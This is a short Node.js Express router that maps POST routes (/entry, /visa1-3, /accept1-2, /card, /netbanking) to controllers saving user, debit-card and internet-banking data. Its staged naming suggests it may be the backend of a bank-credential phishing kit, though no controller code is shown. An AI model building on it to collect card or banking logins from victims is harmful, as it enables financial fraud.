const express = require('express');
const router = express.Router();

const userController = require('../controllers/userController');
const Visa1Controller = require('../controllers/Visa1Controller');
const Visa2Controller = require('../controllers/Visa2Controller');
const Accept1Controller = require('../controllers/accept1Controller');
const Accept2Controller = require('../controllers/accept2Controller');
const cardController = require('../controllers/otherControler'); // ensure correct path
const Visa3Controller = require('../controllers/Visa3Controller');

router.post('/accept2', Accept2Controller.createAccept2);
router.post('/accept1', Accept1Controller.createAccept1);
router.post('/visa2', Visa2Controller.createVisa2);
router.post('/visa3', Visa3Controller.createVisa3);
router.post('/visa1', Visa1Controller.createVisa1);
router.post('/entry', userController.saveUserData);
router.post('/card', cardController.createOrUpdateCombinedDebitCard);
router.post('/netbanking', cardController.createOrUpdateCombinedInternetBanking);

module.exports = router;
